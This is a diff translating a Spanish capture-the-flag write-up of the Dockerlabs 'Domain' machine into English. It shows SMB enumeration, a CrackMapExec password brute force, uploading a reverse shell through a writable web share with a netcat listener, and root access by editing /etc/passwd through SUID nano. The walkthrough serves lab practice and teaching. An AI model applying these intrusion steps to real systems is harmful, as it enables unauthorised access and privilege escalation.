@@ -1,19 +1,18 @@
 # Domain
 
-Pequeña Máquina en modo **medium** de Dockerlabs.
+<center><img src="https://dockerlabs.es/static/images/logos/logo.png" width="150px"></center>
 
-- [Reconocimiento](#reconocimiento)
-- [Escaneo](#escaneo)
-- [Enumeración](#enumeración)
-- [Explotación](#explotación)
-- [Escalada de privilegios](#escalada-de-privilegios)
+## Contents
 
-<br/>
+- [Reconnaissance](#reconnaissance)
+- [Scanning](#scanning)
+- [Enumeration](#enumeration)
+- [Exploitation](#exploitation)
+- [Privilege Escalation](#privilege-escalation)
 
-## Reconocimiento
+## Reconnaissance
 
-La máquina objetivo se encuentra correctamente desplegada dentro de la red de laboratorio (en este caso, utilizando Docker).  
-Para identificarla se realizó el uso de `arp-scan` para identificar los dispositivos en nuestra red docker con la interfaz `docker0`
+The target machine is deployed inside the lab network (here using Docker). To identify it, `arp-scan` was used to find devices on the `docker0` interface:
 
 ```bash
 sudo arp-scan -I docker0 --localnet
@@ -24,11 +23,9 @@ Starting arp-scan 1.10.0 with 65536 hosts (https://github.com/royhills/arp-scan)
 172.17.0.2	02:42:ac:11:00:02	(Unknown: locally administered)
 ```
 
-<br/>
+## Scanning
 
-## Escaneo
-
-Se realizó un escaneo con **Nmap** para identificar puertos abiertos y servicios:
+An **Nmap** scan was performed to identify open ports and services:
 
 ```bash
 nmap -p- --open -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
@@ -60,15 +57,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ```
 
-<br/>
+## Enumeration
 
-## Enumeración
-
-Al detectarse varios puertos, desde un **80** con aplicativo web y un par de **139** y **445** indicando un posible servicio de `SAMBA` corriendo se empezó primero con el sitio web.
+After several ports were detected — a web application on **80** and **139** / **445** indicating a possible `SAMBA` service — the web site was checked first.
 
 ![SAMBAWeb](https://i.imgur.com/q3s8D4z.png)
 
-Se enumeró con **Gobuster** en búsqueda de directorios pero los resultados fueron pobres, por lo que se procedió a los servicios de SAMBA en los puertos anteriormente mencionados.
+Directory enumeration was performed with **Gobuster**, but results were sparse, so attention shifted to the SAMBA services on the previously mentioned ports.
 
 ```bash
 > gobuster dir -u "172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,php.bak -t 20 -o gobuster.txt
@@ -95,7 +90,7 @@ Finished
 ===============================================================
 ```
 
-Al ejecutar el `smbclient` se pudo obtener la lista de recursos compartidos del hosts target.
+Running `smbclient` allowed obtaining the list of shares on the target host.
 
 ```bash
 > smbclient -L \\\\172.17.0.2 -N
@@ -111,11 +106,11 @@ Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT
 Unable to connect with SMB1 -- no workgroup available
 ```
 
-Teniendo en cuenta que en el scan de **nmap** se había encontrado un mensaje con una posible vulnerabilidad de que el servicio tenía el signing activado pero no era requerido: ` Message signing enabled but not required`, se intentó acceder sin usuario y sin contraseña pero los esfuerzos no dieron resultados positivos.
+Given that the **nmap** scan reported a possible vulnerability stating that the service had message signing enabled but not required: `Message signing enabled but not required`, access was attempted with empty username and password but these efforts were unsuccessful.
 
 ![Denied](https://i.imgur.com/UXUrDjg.png)
 
-En base a esto se realizó otro scaneo con **nxc** y **Nmap** implementando scripts para enumerar directamente el puerto **445** y ver qué resultados se obtenían.
+Based on this, another scan was run with **nxc** and **Nmap** using scripts to enumerate port **445** directly to see what results appeared.
 
 Nxc:
 
@@ -146,7 +141,7 @@ Host script results:
 Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
 ```
 
-Obteniendo esto se procede a utilizar el **rpcclient** para realizar una enumeración un poco más enfocada a ejecutar funciones de **Microsoft RPC**, de esta manera se obtuvo un par de usuarios.
+With this information, **rpcclient** was used to perform a more focused enumeration by executing Microsoft RPC functions, which returned a couple of users.
 
 ```bash
 > rpcclient -U '' -N 172.17.0.2
@@ -156,7 +151,7 @@ index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: bob	Name: bob	Desc:
 rpcclient $>
 ```
 
-Lo siguiente fue realizar ataques de fuerza bruta para encontrar contraseñas de algunos de estos usuarios, primeramente se pensó en **Hydra** pero no soporta SMBv1 por lo que se consideró más apropiado el uso de **CrackMapExec** teniendo en cuenta un posible entorno de windows.
+The next step was to attempt brute force attacks to find passwords for some of these users. Initially Hydra was considered, but since it doesn't support SMBv1, **CrackMapExec** was deemed more appropriate given the possible Windows-like environment.
 
 ```bash
 > crackmapexec smb 172.17.0.2 -u bob -p /usr/share/wordlists/rockyou.txt | grep -v -E 'LOGON_FAILURE'
@@ -165,9 +160,9 @@ SMB                      172.17.0.2      445    AEE0F4D201AC     [*] Windows 6.1
 SMB                      172.17.0.2      445    AEE0F4D201AC     [+] AEE0F4D201AC\bob:star
 ```
 
-## Explotación
+## Exploitation
 
-El resultado del anterior bruteforce arrojó una contraseña para el usuario `bob` que luego pudo ser utilizada para conectarse desde el **smbclient** a la red de recursos compartidos.
+The previous brute force revealed a password for user `bob`, which was then used to connect with **smbclient** to the shared resource.
 
 ```bash
 > smbclient \\\\172.17.0.2\\html -U "bob"%"star"
@@ -180,21 +175,19 @@ smb: \> ls
 		38818336 blocks of size 1024. 1555844 blocks available
 ```
 
-Con el comando `get index.html` se obtuvo el fichero y se determinó que era el mismo alojado en la página principal con el puerto **80** por lo que se procedió a realizar un **Unrestricted File Upload** y cargar una reverse shell con el comando `put` ya codificada para conectarse desde la terminal usando **netcat**.
+Using the `get index.html` command the file was retrieved and determined to be the same as the site hosted on port **80**, so an **Unrestricted File Upload** was performed: a reverse shell was uploaded using `put`, already encoded to connect back via **netcat**.
 
 ![Uploading Shell](https://i.imgur.com/DSMKiMF.png)
 
-Desde el navegador se accedió al a url de shell y el resultado fue positivo para realizar una conexión en reversa.
+The uploaded shell URL was accessed from the browser and the result was positive — a reverse connection was achieved.
 
 ![Reverse Shell](https://i.imgur.com/UUglTkO.png)
 
-<br/>
+## Privilege Escalation
 
-## Escalada de privilegios
+After receiving the reverse shell on the Kali machine, the `whoami` command showed the user `www-data`. The `/etc/passwd` file was inspected to find users capable of executing `/bin/bash` in order to attempt privilege escalation. The TTY was also upgraded to work interactively with the shell.
 
-Luego de recibir la reverse shell en la máquina Kali, el comando `whoami` reveló el usuario `www-data` por lo que se revisó el archivo `/etc/passwd` para analizar qué usuarios eran capaces de ejecutar `/bin/bash` y así poder obtener una escalada de privilegios.
-Por otro lado también se hizo tratamiento de la tty para trabajar de manera interactiva con la shell.
-En el listado se encontró al usuario `bob` del cual ya se había accedido a su contraseña, por lo que se realizó un `su bob` para cambiar al mismo
+In the listing, user `bob` was found (for whom the password was already obtained), so `su bob` was used to switch to that user.
 
 ```bash
 > nc -nlvp 443
@@ -244,7 +237,7 @@ Password:
 bob@aee0f4d201ac:/$
 ```
 
-Siendo `bob` y buscando **binarios** con SUID o que pudiesen ser aprovechados para obtener el `root` se encontró el bin `nano`, de manera que se intentó directamente modificar el `/etc/passwd` y remover la **x** del usuario root para así quitarle la autenticación por contraseña, con el tratamiento de la tty no hubo inconvenientes al momento de hacer la manipulación con `nano`
+As `bob`, a search was performed for SUID binaries or other binaries that could be leveraged to obtain `root`. The `nano` binary was found, so it was used to directly modify `/etc/passwd` and remove the `x` from the root account to disable password authentication. With the TTY already handled, editing with `nano` proceeded without issues.
 
 ```bash
 bob@aee0f4d201ac:/$ find / -perm -4000 2>/dev/null
@@ -264,6 +257,8 @@ bob@aee0f4d201ac:/$ su root
 root@aee0f4d201ac:/#
 ```
 
-Luego de haber modificado el archivo se utilizó el `su root` y no hubo **input** alguno para ingresar la contraseña, automáticamente se accedió al user `root` y con esto ya se alcanzó el control sobre la máquina.
+After modifying the file, `su root` was used and no password prompt appeared — access to the `root` user was obtained automatically, thus achieving full control of the machine.
+
+---
 
 _Written by **kur0bai**_
